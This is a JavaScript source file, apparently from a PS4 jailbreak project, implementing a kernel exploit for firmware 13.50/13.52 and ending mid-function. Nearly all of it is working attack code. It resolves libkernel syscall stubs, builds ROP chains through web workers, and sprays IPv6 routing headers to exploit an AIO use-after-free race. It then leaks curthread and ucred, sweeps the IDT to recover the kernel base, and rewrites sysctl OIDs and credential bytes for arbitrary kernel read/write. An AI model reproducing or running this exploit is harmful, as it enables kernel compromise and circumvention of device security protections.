// k0_raw13g.js — raw13g (Raw Game Team) K0 exploit for 13.50/13.52
// aio_multi_delete UAF (bug 663 / "lapse") → kernel R/W + kernel base + ucred
// Uses project's window.p (read1/2/4/8, write1/2/4/8, leakval) and goldhen.js gadgets (callAddr, sc)

import { int64 } from "./int64.js?v=9";

/**
 * Run the raw13g K0 exploit.
 * @param {Object} p - window.p from mem.js (read1/2/4/8, write1/2/4/8, leakval, readInto)
 * @param {Object} off - offsets from ps4_offsets_userland.js
 * @param {Object} G - gadgets from goldhen.js (G0-G5, POP_RDI_RET, etc.)
 * @param {Function} callAddr - goldhen.js callAddr(target, args) → {lo, hi, i32}
 * @param {Function} sc - goldhen.js sc(sysnum, ...args) → {lo, hi, i32}
 * @param {Function} log - logger
 * @returns {Promise<Object>} { kernelBase, ucred, curthread, kv: { read8, write8 } }
 */
export async function raw13gK0Exploit(p, off, G, callAddr, sc, log) {
    // --- Constants ---
    const SYS = {
        getpid: 20, getuid: 0x18, close: 6,
        socket: 97, socketpair: 0x87,
        getsockopt: 118, setsockopt: 0x69,
        mmap: 477, munmap: 73,
        aio_multi_poll: 664, aio_multi_delete: 662,
        aio_multi_wait: 663, aio_submit_cmd: 669,
        aio_multi_cancel: 666,
        sysctl: 202, cpuset_getaffinity: 487, cpuset_setaffinity: 488,
    };
    const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51, IPV6_TCLASS = 61;
    const AF_INET6 = 28, SOCK_DGRAM = 2, AF_UNIX = 1, SOCK_STREAM = 1;
    const RTH_SIZE = 0x48, RTH_LEN = 8, RTH_SEGLEFT = 4;
    const SCRATCH_PAGE = 0x04000000;
    const SYS_MMAP = 477;
    const PROT_RW = 3, MAP_PRIVATE = 2, MAP_FIXED = 0x10, MAP_ANON = 0x1000;
    const NODE_SZ = 0x38;
    const N_LEAK = 262144;
    const SPRAY = 512;
    const SPIN = 40000000;
    const TOWAIT = 1000;
    const KA = 32768;
    const KB = 0x10001;
    const STEP_MAG = 0x10000, PAIR = STEP_MAG + 1;
    const STEP_OFF = 2;
    const TD_UCRED_OFF = 0x130, CR_RUID_OFF = 0x08;
    const IDT_BASE = new int64(0x00001a00, 0xffffff80);
    const GATE_SZ = 16;
    const SWEEP = 256;
    const MAXN = 2 * KA + KB + 16;

    const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
    const NEG1 = new int64(0xffffffff, 0xffffffff);
    const KF_MARK = 0x41, KERN_FILE_NUM = 15, ONUM_N = 64;
    const KF_BYTES = 1 << 20;
    const CAPS_TARGET = 0x60, CAPS_B_OFF = 0x67, CAPS_PR_OFF = 0x64;

    // --- Helpers using project's p ---
    function bufAddr(ab) {
        const c = p.leakval(ab);
        return p.read8(p.read8(c.add32(off.wk_JSFunction_m_function)).add32(off.wk_ArrayBuffer_m_impl)).add32(off.wk_ArrayBuffer_m_contents_m_data);
    }
    function put(dv, at, v) {
        if (typeof v === "number") { dv.setUint32(at, v >>> 0, true); dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true); }
        else { dv.setUint32(at, v.low >>> 0, true); dv.setUint32(at + 4, v.hi >>> 0, true); }
    }

    // --- Resolve syscall stubs from libkernel ---
    const cell = p.leakval(Math.expm1);
    const nativeFn = p.read8(p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function));
    const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
    const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
    const libkernelBase = errorFn.sub32(off.k__error);

    const stubAddr = new Map();
    if (off.k_stubs) {
        for (const numStr in off.k_stubs) {
            const num = +numStr, o = off.k_stubs[numStr];
            const v = p.read8(libkernelBase.add32(o));
            if ((v.low & 0x00ffffff) === 0xc0c748 && (v.hi >>> 24) === 0x49) {
                const snum = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
                if (snum === num) stubAddr.set(num, libkernelBase.add32(o));
            }
        }
    }
    // Scan for missing
    for (let o = 0; o < off.k_scan_stage1 && stubAddr.size < Object.keys(SYS).length; o += 16) {
        const v = p.read8(libkernelBase.add32(o));
        if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
        const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
        if (!stubAddr.has(num)) stubAddr.set(num, libkernelBase.add32(o));
    }

    // --- Verify gadgets ---
    const requiredGadgets = ["POP_RDI_RET", "POP_RSI_RET", "POP_RDX_RET", "POP_RCX_RET", "POP_R8_RET", "POP_R9_RET", "POP_RAX_RET", "LEAVE_RET", "MOV_RDI_RAX_RET", "G0", "G1", "G2", "G3", "G4", "G5"];
    for (const g of requiredGadgets) {
        if (!G[g]) throw new Error("missing gadget: " + g);
    }
    const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET, G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];

    // --- Scratch page + socket for kernel R/W verification ---
    const mr = sc(SYS_MMAP, SCRATCH_PAGE, 0x10000, PROT_RW, MAP_FIXED | MAP_ANON | MAP_PRIVATE, -1, 0);
    const mgot = new int64(mr.lo, mr.hi);
    if (mgot.hi !== 0 || mgot.low !== SCRATCH_PAGE) throw new Error("scratch page map failed");
    const vs = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32; if (vs < 0) throw new Error("verify socket");
    { const tAb = new ArrayBuffer(RTH_SIZE), tDv = new DataView(tAb); tDv.setUint8(1, RTH_LEN); tDv.setUint8(3, RTH_SEGLEFT); sc(SYS.setsockopt, vs, IPPROTO_IPV6, IPV6_RTHDR, bufAddr(tAb), RTH_SIZE); const RT = SCRATCH_PAGE + 0x2000; const lenAb = new ArrayBuffer(8), lenDv = new DataView(lenAb), lenAd = bufAddr(lenAb); lenDv.setUint32(0, RTH_SIZE, true); const g1 = sc(SYS.getsockopt, vs, IPPROTO_IPV6, IPV6_RTHDR, RT, lenAd).i32; const s2 = sc(SYS.setsockopt, vs, IPPROTO_IPV6, IPV6_RTHDR, RT, lenDv.getUint32(0, true)).i32; if (g1 !== 0 || s2 !== 0) throw new Error("scratch page rw"); }

    // --- CPU pinning ---
    const CPU_LEVEL_WHICH = 3, CPU_WHICH_TID = 1, CPUSET_SZ = 0x10;
    const ID64 = new int64(0xffffffff, 0xffffffff);
    const mskAb = new ArrayBuffer(CPUSET_SZ), mskDv = new DataView(mskAb), mskAd = bufAddr(mskAb);
    const affGot = sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID, ID64, CPUSET_SZ, mskAd).i32;
    const savedMask = mskDv.getUint32(0, true) >>> 0;
    const cores = []; for (let i = 0; i < 32; i++) if (savedMask & (1 << i)) cores.push(i);
    const PINCORE = cores[0];
    new Uint8Array(mskAb).fill(0); mskDv.setUint32(0, (1 << PINCORE) >>> 0, true);
    sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID, ID64, CPUSET_SZ, mskAd);

    // --- AIO structures ---
    const mAb = new ArrayBuffer(0x40), mU32 = new Uint32Array(mAb), mU8 = new Uint8Array(mAb), M_AD = bufAddr(mAb); mU32.fill(0); mU32[6] = 4;
    const OWNER_LO = 6, OWNER_HI = 7;
    const lkAb = new ArrayBuffer(0x40), lkDv = new DataView(lkAb), lkAd = bufAddr(lkAb);
    const LX = lkAd.add32(0x00), LC = lkAd.add32(0x10);
    const bspAb = new ArrayBuffer(8), bspDv = new DataView(bspAb);
    if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, bufAddr(bspAb)).i32 !== 0) throw new Error("block socketpair");
    const bsp0 = bspDv.getInt32(0, true), bsp1 = bspDv.getInt32(4, true);
    const brbAb = new ArrayBuffer(0x40), brqAb = new ArrayBuffer(8 * 0x28), brqDv = new DataView(brqAb);
    for (let k = 0; k < 8; k++) { put(brqDv, k * 0x28 + 0x08, 0x40); put(brqDv, k * 0x28 + 0x10, bufAddr(brbAb)); brqDv.setInt32(k * 0x28 + 0x20, bsp0, true); }
    const bidAb = new ArrayBuffer(8 * 4);

    log("PR-SATURATE", sc(SYS.aio_submit_cmd, 1 | 0x1000, bufAddr(brqAb), 8, 3, bufAddr(bidAb)).i32);

    const spAb = new ArrayBuffer(8), spDv = new DataView(spAb);
    if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, bufAddr(spAb)).i32 !== 0) throw new Error("socketpair");
    const sp0 = spDv.getInt32(0, true), sp1 = spDv.getInt32(4, true);
    const rbAb = new ArrayBuffer(0x40), rqAb = new ArrayBuffer(2 * 0x28), rqDv = new DataView(rqAb);
    for (let k = 0; k < 2; k++) { put(rqDv, k * 0x28 + 0x08, 0x40); put(rqDv, k * 0x28 + 0x10, bufAddr(rbAb)); rqDv.setInt32(k * 0x28 + 0x20, sp0, true); }
    const idAb2 = new ArrayBuffer(8), idAd2 = bufAddr(idAb2);
    const stAb2 = new ArrayBuffer(8), stAd2 = bufAddr(stAb2);

    const toAb = new ArrayBuffer(8), toDv = new DataView(toAb), toAd = bufAddr(toAb);
    toDv.setUint32(0, TOWAIT, true); toDv.setUint32(4, 0, true);

    const POOL = []; for (let i = 0; i < SPRAY; i++) { const fd = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32; if (fd < 0) break; POOL.push(fd); }
    log("PR-POOL", "reclaim sockets=" + POOL.length);

    const pAb = new ArrayBuffer(RTH_SIZE), pDv = new DataView(pAb), pAd = bufAddr(pAb);
    function setNode0(nextAddr, secondDec) { new Uint8Array(pAb).fill(0); pDv.setUint8(1, RTH_LEN); pDv.setUint8(3, RTH_SEGLEFT); put(pDv, 0x08, secondDec); put(pDv, 0x10, M_AD); put(pDv, 0x30, nextAddr); }

    let armCount = 0;
    function armOnce() {
        for (const fd of POOL) sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
        const rs = sc(SYS.aio_submit_cmd, 1 | 0x1000, bufAddr(rqAb), 2, 3, idAd2).i32;
        if (rs !== 0) return "submit=" + rs;
        toDv.setUint32(0, TOWAIT, true); toDv.setUint32(4, 0, true);
        sc(SYS.aio_multi_wait, idAd2, 2, stAd2, 0, toAd);
        let n = 0; for (const fd of POOL) if (sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, pAd, RTH_SIZE).i32 === 0) n++;
        armCount++; return "ok sprayed=" + n;
    }

    // --- Worker setup for parallel armings ---
    async function bringWorker() {
        const w = { worker: new Worker("rpc_worker.js"), armed: false, wired: false };
        w.rpc = makeRpc(w.worker);
        if ((await w.rpc("ping", 15000)) !== "pong") throw new Error("worker ping");
        const sLo = 0x10100000, sHi = 0xc0de0000;
        const arr = await w.rpc("init", 15000, sLo, sHi);
        const D = bufAddr(arr.buffer);
        if (p.read4(D) >>> 0 !== sLo) throw new Error("worker transfer");
        const storage = p.read8(D.add32(0x10));
        const mc = (storage.hi > 0 && (storage.low & 7) === 0) ? p.read8(storage.add32(8)) : null;
        if (!mc || mc.hi <= 0 || (mc.low & 7) !== 0) throw new Error("worker walk");
        const bf = p.read8(mc.add32(8));
        let wm = null, wv = null, wl = null;
        for (let k = 1; k <= 8; ++k) {
            const val = p.read8(bf.sub32(8 * k));
            if (val.hi <= 0 || (val.low & 7) !== 0) continue;
            const inl = p.read8(val.add32(0x10));
            const len = p.read4(val.add32(0x18)) >>> 0;
            if (inl.hi === 0 && inl.low === 2) { if (!wl) wl = val; }
            else if (inl.hi > 0 && len === 6) { if (!wm) wm = val; }
            else if (inl.hi > 0 && len === 0x30) { if (!wv) wv = val; }
        }
        if (!(wm && wv && wl)) throw new Error("worker shapes");
        w.master = wm; w.origVector = p.read8(wm.add32(0x10));
        p.write8(wm.add32(0x10), wv); w.wired = true;
        await w.rpc("setup", 15000, wl.low, wl.hi);
        await w.rpc("armPivot", 15000, G.G0.low, G.G0.hi);
        w.armed = true;
        w.ctx = makeCtx();
        w.fire = function (num, args, ms) { layout(w.ctx, stubAddr.get(num), args); return w.rpc("fire", ms === undefined ? 20000 : ms, w.ctx.S.low, w.ctx.S.hi); };
        return w;
    }
    function makeRpc(worker) {
        let seq = 0; const pending = new Map();
        worker.onmessage = function (e) { const d = e.data || {}; const slot = pending.get(d.id); if (!slot) return; pending.delete(d.id); if (slot.timer) clearTimeout(slot.timer); if (d.type === "err") slot.reject(new Error(String(d.value))); else slot.resolve(d.value); };
        worker.onerror = (e) => log("WORKER-ERR", String(e));
        return function call(fname, timeoutMs, ...args) { return new Promise(function (resolve, reject) { const id = seq++; const timer = timeoutMs > 0 ? setTimeout(() => { pending.delete(id); reject(new Error(fname + " timeout")); }, timeoutMs) : null; pending.set(id, { resolve, reject, timer }); worker.postMessage({ id, name: fname, args }); }); };
    }

    // --- ROP context / callAddr implementation (using project's callAddr) ---
    const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
    function makeCtx() {
        const sb = new ArrayBuffer(0x20), pb = new ArrayBuffer(PB_SIZE), kb = new ArrayBuffer(0x2000), fb = new ArrayBuffer(0x40);
        const c = { storeDv: new DataView(sb), pivotDv: new DataView(pb), stackDv: new DataView(kb), frameDv: new DataView(fb), stackU8: new Uint8Array(kb), frameU8: new Uint8Array(fb) };
        c.S = bufAddr(sb); c.P = bufAddr(pb); c.K = bufAddr(kb); c.F = bufAddr(fb);
        put(c.storeDv, 0x00, G.G1); put(c.storeDv, 0x08, c.P);
        put(c.storeDv, 0x10, G.G3); put(c.storeDv, 0x18, G.G2);
        put(c.pivotDv, 0x00, c.P); put(c.pivotDv, 0x10, G.G5); put(c.pivotDv, 0x20, G.G4);
        return c;
    }
    function layout(c, target, args) {
        c.stackU8.fill(0); c.frameU8.fill(0);
        const insts = [];
        for (let i = 0; i < args.length; ++i) { insts.push(argGadget[i]); insts.push(args[i]); }
        const targetIdx = insts.length;
        insts.push(target); insts.push(G.POP_RDI_RET); insts.push(c.F);
        insts.push(G.MOV_RDI_RAX_RET); insts.push(G.POP_RAX_RET); insts.push(JSVALUE_UNDEFINED); insts.push(G.LEAVE_RET);
        let at = 0x2000 - 8 * insts.length;
        if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
        for (let i = 0; i < insts.length; ++i) put(c.stackDv, at + 8 * i, insts[i]);
        put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
    }
    const M = makeCtx();

    // --- Leak curthread via aio_multi_cancel race (w1) ---
    const lkNodes = new ArrayBuffer(NODE_SZ * N_LEAK), lkNdv = new DataView(lkNodes), lkNad = bufAddr(lkNodes);
    const w1 = await bringWorker();
    async function leakCurthread(w) {
        toDv.setUint32(0, TOWAIT, true); toDv.setUint32(4, 0, true);
        new Uint8Array(lkNodes).fill(0);
        for (let i = 0; i < N_LEAK; i++) { const o = i * NODE_SZ; put(lkNdv, o + 0x00, LX); put(lkNdv, o + 0x08, LC); put(lkNdv, o + 0x10, M_AD); put(lkNdv, o + 0x30, i === N_LEAK - 1 ? 0 : lkNad.add32(o + NODE_SZ)); }
        lkDv.setInt32(0x00, 0x40000000, true); lkDv.setInt32(0x10, 0x40000000, true); mU32[6] = 4; mU32[7] = 0; setNode0(lkNad, LC);
        const a = armOnce(); if (a.indexOf("ok") !== 0) return null;
        let hitLo = 0, hitHi = 0, hits = 0; const samples = [];
        let pr; try { pr = w.fire(SYS.aio_multi_cancel, [idAd2, 1, stAd2]); } catch (e) {}
        for (let i = 0; i < SPIN; i++) { mU8[0x30 + (i & 15)] = i & 0xff; const hi1 = mU32[OWNER_HI]; if (hi1 !== 0) { const lo = mU32[OWNER_LO]; const hi2 = mU32[OWNER_HI]; if (hi1 === hi2 && lo !== 4) { if (!hits) { hitLo = lo; hitHi = hi1; } hits++; if (samples.length < 32) samples.push((hi1 >>> 0).toString(16).padStart(8, "0") + (lo >>> 0).toString(16).padStart(8, "0")); if (hits > 48) break; } } }
        try { if (pr) await pr; } catch (e) {}
        if (!hits || (hitHi >>> 0) < 0xffff0000) return null;
        const uniq = {}; for (const v of samples) uniq[v] = (uniq[v] || 0) + 1;
        if (Object.keys(uniq).length !== 1) return null;
        return new int64(hitLo >>> 0, hitHi >>> 0);
    }
    const CT1 = await leakCurthread(w1);
    if (!CT1) throw new Error("curthread leak failed");
    log("PR-CURTHREAD", "w1=" + CT1);

    // --- Pass A + Pass B pointer read to get ucred ---
    const X1 = CT1.add32(TD_UCRED_OFF);
    const dumAb = new ArrayBuffer(0x40), dumDv = new DataView(dumAb), dumAd = bufAddr(dumAb); dumDv.setInt32(0x00, 0x40000000, true); const DUM = dumAd.add32(0x00);
    const snkAb = new ArrayBuffer(0x40), snkDv = new DataView(snkAb), snkAd = bufAddr(snkAb); snkDv.setInt32(0x00, 0x40000000, true); snkDv.setInt32(0x20, 0x40000000, true); const SNK = snkAd.add32(0x00), N0SINK = snkAd.add32(0x20);

    const arAb = new ArrayBuffer(NODE_SZ * MAXN), arDv = new DataView(arAb), arAd = bufAddr(arAb);
    function wnode(i, decAddr, sinkAddr, last) { const o = i * NODE_SZ; put(arDv, o + 0x00, decAddr); put(arDv, o + 0x08, sinkAddr); put(arDv, o + 0x10, M_AD); put(arDv, o + 0x30, last ? 0 : arAd.add32(o + NODE_SZ)); }

    function reapNow() { wnode(0, DUM, DUM, true); sc(SYS.aio_multi_cancel, idAd2, 2, stAd2); sc(SYS.aio_multi_poll, idAd2, 2, stAd2); sc(SYS.aio_multi_delete, idAd2, 2, stAd2); }

    function runChain(nNodes, label) {
        snkDv.setInt32(0x00, 0x40000000, true); snkDv.setInt32(0x20, 0x40000000, true);
        mU32[OWNER_LO] = 4; mU32[OWNER_HI] = 0; setNode0(arAd, N0SINK);
        const a = armOnce(); if (a.indexOf("ok") !== 0) return null;
        sc(SYS.aio_multi_cancel, idAd2, 1, stAd2);
        const moved = 0x40000000 - snkDv.getInt32(0x00, true);
        reapNow(); return moved;
    }

    // Pass A
    let i = 0;
    for (let j = 0; j < KA; j++) { wnode(i++, X1.add32(STEP_OFF), DUM, false); wnode(i++, X1, SNK, false); }
    const subA = (0x100000000 - ((KA * PAIR) % 0x100000000)) % 0x100000000;
    const dA = [subA & 0xff, (subA >>> 8) & 0xff, (subA >>> 16) & 0xff, (subA >>> 24) & 0xff];
    for (let j = 0; j < 4; j++) for (let d = 0; d < dA[j]; d++) wnode(i++, X1.add32(j), DUM, false);
    const mA = runChain(i, "passA"); if (mA === null || mA <= 0) throw new Error("passA failed");
    const kA = KA - mA + 1; log("PR-PASSA", "m=" + mA + " k=" + kA);

    // Pass B
    const RED = (kA - 1) * PAIR; i = 0;
    const dga = [RED & 0xff, (RED >>> 8) & 0xff, (RED >>> 16) & 0xff, (RED >>> 24) & 0xff];
    for (let j = 0; j < 4; j++) for (let d = 0; d < dga[j]; d++) wnode(i++, X1.add32(j), DUM, false);
    for (let j = 0; j < KB; j++) wnode(i++, X1, SNK, false);
    const totB = (RED + KB) % 0x100000000;
    const subB = (0x100000000 - totB) % 0x100000000;
    const dB = [subB & 0xff, (subB >>> 8) & 0xff, (subB >>> 16) & 0xff, (subB >>> 24) & 0xff];
    for (let j = 0; j < 4; j++) for (let d = 0; d < dB[j]; d++) wnode(i++, X1.add32(j), DUM, false);
    const mB = runChain(i, "passB"); if (mB === null || mB <= 0) throw new Error("passB failed");
    const R = KB - mB + 1;
    const W0 = (kA - 1) * PAIR + R;

    const UCRED = new int64(W0 >>> 0, CT1.hi >>> 0);
    log("PR-UCRED", "ucred=" + UCRED);

    // --- Anchor sweep (IDT reserved gate) to find kernel base ---
    const RVA_RSVD = off.k_idt_rsvd;
    const JOBS = [
        { n: "b0", j: 0, g: 22, want: null, low: () => 0x000000 },
        { n: "b1", j: 1, g: 24, want: null, low: () => { return (B.b0 << 16) >>> 0; } },
        { n: "b3", j: 3, g: 25, want: 0x00, low: () => { return ((0x20 << 16) | (B.b1 << 8) | B.b0) >>> 0; } },
        { n: "b5", j: 5, g: 26, want: 0x8e, low: () => 0x000020 },
        { n: "b6", j: 6, g: 27, want: null, low: () => 0x8e0000 },
        { n: "b7", j: 7, g: 31, want: null, low: () => { return ((B.b6 << 16) | 0x8e00) >>> 0; } },
        { n: "b6d", j: 6, g: 20, want: null, low: () => 0x8e0000 },
        { n: "b7d", j: 7, g: 15, want: null, low: () => { return ((B.b6 << 16) | 0x8e00) >>> 0; } },
    ];
    const B = {}; const NJ = JOBS.length; const NEED = NJ * SWEEP * 2;
    if (NEED > MAXN) throw new Error("anchor sweep exceeds arena");

    const anAb = new ArrayBuffer(4 * NJ * SWEEP), anDv = new DataView(anAb), anAd = bufAddr(anAb);
    for (let i = 0; i < NJ * SWEEP; i++) anDv.setInt32(i * 4, 0x40000000, true);

    let idx = 0;
    for (let q = 0; q < NJ; q++) { const o = JOBS[q].g * GATE_SZ + JOBS[q].j; const stepAd = IDT_BASE.add32(o); const probeAd = IDT_BASE.add32(o - 3); for (let k = 0; k < SWEEP; k++) { wnode(idx++, stepAd, DUM, false); wnode(idx++, probeAd, anAd.add32((q * SWEEP + k) * 4), false); } }
    put(arDv, (idx - 1) * NODE_SZ + 0x30, 0);
    if (runChain(idx, "anchor-sweep") === null) throw new Error("anchor sweep failed");

    function simPattern(bv, low) { let w = ((bv << 24) >>> 0) | (low & 0xffffff) | 0; let out = ""; for (let k = 0; k < SWEEP; k++) { w = (w - 0x1000000) | 0; w = (w - 1) | 0; out += w <= 0 ? "1" : "0"; } return out; }
    function decodeByte(obs, low) { let hit = -1, n = 0; for (let bv = 0; bv < 256; bv++) if (simPattern(bv, low) === obs) { if (hit < 0) hit = bv; n++; } return { b: hit, n: n }; }

    let bad = 0;
    for (let q = 0; q < NJ; q++) { const J = JOBS[q]; let obs = "", ones = 0, edge = -1; for (let k = 0; k < SWEEP; k++) { const f = 0x40000000 - anDv.getInt32((q * SWEEP + k) * 4, true) > 0; obs += f ? "1" : "0"; if (f) ones++; if (k > 0 && obs[k] !== obs[k - 1] && edge < 0) edge = k; } const low = J.low(); const d = decodeByte(obs, low); B[J.n] = d.b; if (d.b < 0 || d.n !== 1) bad++; }
    if (bad > 0 || B.b6 !== B.b6d || B.b7 !== B.b7d) throw new Error("anchor decode failed");

    const handlerLo = (((B.b7 << 24) >>> 0) + ((B.b6 << 16) >>> 0) + (B.b1 << 8) + B.b0) >>> 0;
    const kbLo = (handlerLo - RVA_RSVD) >>> 0;
    const KBASE = new int64(kbLo, 0xffffffff);
    if ((kbLo & 0x3fff) !== 0) throw new Error("kernel base not aligned");
    log("ANCHOR", "kernel_base=" + KBASE + " handler=0xffffffff" + handlerLo.toString(16).padStart(8, "0"));

    // --- Caps + oid_number sweep to get kernel R/W via sysctl ---
    const OID = KBASE.add32(off.k_oid_kern_file), O_NUM = OID.add32(0x10), O_VIS = OID.add32(0x50), O_RAN = OID.add32(0x54);
    const mibAb = new ArrayBuffer(8), mibDv = new DataView(mibAb), mibAd = bufAddr(mibAb); mibDv.setInt32(0, 1, true); mibDv.setInt32(4, KERN_FILE_NUM, true);
    const kfAb = new ArrayBuffer(KF_BYTES), kfDv = new DataView(kfAb), kfAd = bufAddr(kfAb);
    const olAb = new ArrayBuffer(8), olDv = new DataView(olAb), olAd = bufAddr(olAb);
    function kernFile(withBuf) { olDv.setInt32(0, withBuf ? KF_BYTES : 0, true); olDv.setInt32(4, 0, true); const r = sc(SYS.sysctl, mibAd, 2, withBuf ? kfAd : 0, olAd, 0, 0); return { rv: r.i32, err: r.i32 < 0 ? errno() : 0, len: olDv.getUint32(0, true) }; }
    function errno() { const r = callAddr(errorFn, []); const a = new int64(r.lo, r.hi); return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0; }

    const kfSock = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
    if (kfSock >= 0) { const tAb = new ArrayBuffer(4), tDv = new DataView(tAb); tDv.setInt32(0, KF_MARK, true); sc(SYS.setsockopt, kfSock, IPPROTO_IPV6, IPV6_TCLASS, bufAddr(tAb), 4); }

    // Caps sweep
    const CAPS_B = UCRED.add32(CAPS_B_OFF), CAPS_PR = UCRED.add32(CAPS_PR_OFF);
    const sAb = new ArrayBuffer(4 * SWEEP), sDv = new DataView(sAb), sAd = bufAddr(sAb); for (let k = 0; k < SWEEP; k++) sDv.setInt32(k * 4, 0x40000000, true);
    let i2 = 0; for (let k = 0; k < SWEEP; k++) { wnode(i2++, CAPS_B, DUM, false); wnode(i2++, CAPS_PR, sAd.add32(k * 4), false); } wnode(i2++, O_NUM, sAd.add32(SWEEP * 4), true); put(arDv, (i2 - 1) * NODE_SZ + 0x30, 0);
    if (runChain(i2, "caps+oid") === null) throw new Error("caps sweep failed");
    let obs = ""; for (let k = 0; k < SWEEP; k++) obs += 0x40000000 - sDv.getInt32(k * 4, true) > 0 ? "1" : "0";
    const cb = decodeByte(obs, 0x000000); if (cb.b < 0 || cb.n !== 1) throw new Error("caps byte decode failed");
    const bLo = (cb.b - 1) & 0xff, bHi = cb.b; const setLo = (bLo & 0x40) !== 0, setHi = (bHi & 0x40) !== 0;

    let capsWrote = 0;
    if (!setLo || !setHi) { const dN = (bHi + 1) & 0xff; const fin = [(bHi - dN) & 0xff, (bLo - dN) & 0xff, (bHi - dN - 1) & 0xff, (bLo - dN - 1) & 0xff]; if (!fin.every(v => (v & 0x40) !== 0)) throw new Error("caps plan failed"); capsWrote = dN; }

    // Restore oid_number + unhide + caps
    const curNum = (KERN_FILE_NUM - ONUM_N) >>> 0; const pNum = planSub(curNum, (curNum - KERN_FILE_NUM) >>> 0);
    i2 = 0; wnode(i2++, O_VIS, DUM, false); for (let q = 0; q < capsWrote; q++) wnode(i2++, CAPS_B, DUM, false); const pos = []; for (let j = 0; j < 4; j++) for (let d = 0; d < pNum.d[j]; d++) pos.push(j); for (let j = 0; j < pos.length; j++) wnode(i2++, O_NUM.add32(0x18 + pos[j]), DUM, j === pos.length - 1); put(arDv, (i2 - 1) * NODE_SZ + 0x30, 0); if (runChain(i2, "restore+unhide+caps") === null) throw new Error("restore failed");

    const after = kernFile(false); const got = after.rv === 0 ? kernFile(true) : null;
    const capsLive = after.rv === 0;
    if (!capsLive) throw new Error("caps gate did not open");

    // --- Kernel R/W via sysctl on kern_file ---
    const A_OID = KBASE.add32(off.k_oid_maxfilesperproc);
    const A2_OID = KBASE.add32(off.k_oid_maxprocperuid);
    const B_OID = KBASE.add32(off.k_oid_maxfiles);
    const A_ARG1_CUR = KBASE.add32(off.k_arg1_maxfilesperproc);
    const A2_ARG1_CUR = KBASE.add32(off.k_arg1_maxprocperuid);
    const B_ARG1 = B_OID.add32(0x18);

    function planLow(cur, tgt) { if (cur.hi !== tgt.hi) return null; const b = []; for (let k = 0; k < 4; k++) b.push((cur.low >>> (8 * k)) & 0xff); b.push(0, 0, 0, 0); const t = []; for (let k = 0; k < 4; k++) t.push((tgt.low >>> (8 * k)) & 0xff); function decwin(j) { let c = -1; for (let k = 0; k < 4 && j + k < 8; k++) { let v = b[j + k] + c; if (v < 0) { v += 256; c = -1; } else c = 0; b[j + k] = v; if (c === 0) break; } } const pos = []; for (let j = 0; j < 4; j++) { const d = (b[j] - t[j]) & 0xff; for (let q = 0; q < d; q++) { pos.push(j); decwin(j); } } const lowOk = b[0] === t[0] && b[1] === t[1] && b[2] === t[2] && b[3] === t[3]; const hiClean = b[4] === 0 && b[5] === 0 && b[6] === 0 && b[7] === 0; if (!lowOk || !hiClean || pos.length < 1 || pos.length > 4090) return null; return pos; }
    function planSub(cur, delta) { const d = [delta & 0xff, (delta >>> 8) & 0xff, (delta >>> 16) & 0xff, (delta >>> 24) & 0xff]; let clean = true; for (let j = 1; j < 4; j++) if (d[j] > ((cur >>> (8 * j)) & 0xff)) clean = false; return { d, n: d[0] + d[1] + d[2] + d[3], clean }; }

    const posA = planLow(A_ARG1_CUR, B_ARG1); const posA2 = planLow(A2_ARG1_CUR, B_ARG1.add32(4));
    if (!posA || !posA2) throw new Error("krw plan failed");

    i2 = 0; wnode(i2++, A_OID.add32(0x50), DUM, false); wnode(i2++, A2_OID.add32(0x50), DUM, false); wnode(i2++, B_OID.add32(0x50), DUM, false); for (const k of posA) wnode(i2++, A_OID.add32(0x18 + k), DUM, false); for (const k of posA2) wnode(i2++, A2_OID.add32(0x18 + k), DUM, false); put(arDv, (i2 - 1) * NODE_SZ + 0x30, 0); if (runChain(i2, "krw-setup") === null) throw new Error("krw setup failed");

    // Build krw API using project's callAddr for sysctl
    const kmAb = new ArrayBuffer(8), kmDv = new DataView(kmAb), kmAd = bufAddr(kmAb);
    const koAb = new ArrayBuffer(4), koDv = new DataView(koAb), koAd = bufAddr(koAb);
    const knAb = new ArrayBuffer(4), knDv = new DataView(knAb), knAd = bufAddr(knAb);
    const klAb = new ArrayBuffer(8), klDv = new DataView(klAb), klAd = bufAddr(klAb);
    function kMib(a, b) { kmDv.setInt32(0, a, true); kmDv.setInt32(4, b, true); }
    function kSysRead(a, b) { kMib(a, b); klDv.setInt32(0, 4, true); klDv.setInt32(4, 0, true); koDv.setInt32(0, 0, true); const r = sc(SYS.sysctl, kmAd, 2, koAd, klAd, 0, 0).i32; return { rv: r, err: r < 0 ? errno() : 0, val: koDv.getInt32(0, true) }; }
    function kSysWrite(a, b, v) { kMib(a, b); knDv.setInt32(0, v | 0, true); const r = sc(SYS.sysctl, kmAd, 2, 0, 0, knAd, 4).i32; return { rv: r, err: r < 0 ? errno() : 0 }; }
    function steer(X) { kSysWrite(1, 27, X.low | 0); kSysWrite(1, 28, X.hi | 0); }
    function kread32(X) { steer(X); return kSysRead(1, 7).val >>> 0; }
    function kwrite32(X, v) { steer(X); return kSysWrite(1, 7, v | 0).rv; }
    function read8(X) { return new int64(kread32(X), kread32(X.add32(4))); }
